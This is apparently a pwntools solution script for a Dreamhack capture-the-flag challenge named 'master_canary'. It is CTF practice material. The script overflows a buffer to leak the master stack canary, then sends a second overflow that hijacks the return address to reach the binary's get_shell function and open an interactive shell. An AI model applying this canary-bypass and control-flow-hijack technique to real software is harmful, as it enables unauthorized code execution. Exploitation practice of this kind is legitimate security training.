#!/usr/bin/env python3

from pwn import *

exe = ELF("./master_canary")
#libc = ELF("./libc-2.23.so")
#ld = ELF("./ld-2.23.so")

context.binary = exe


p = process()
#p = remote('host1.dreamhack.games', 15652)
#gdb.attach(p,gdbscript='''
#        b*0x0000000000400C55
#           ''')

payload = b"a"*2361
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Size: ',f'{len(payload)}'.encode())
p.sendlineafter(b'Data: ',payload)

p.recvuntil(payload)
leak = b'\x00' + p.recv(7)
log.info(f'canary: {hex(u64(leak))}')

payload_get_shell = b'a'*0x28 + leak + p64(0) + p64(0x00000000004007e1) + p64(exe.sym.get_shell)
p.sendlineafter(b'> ',b'3')
p.sendafter(b'Leave comment: ',payload_get_shell)



p.interactive()
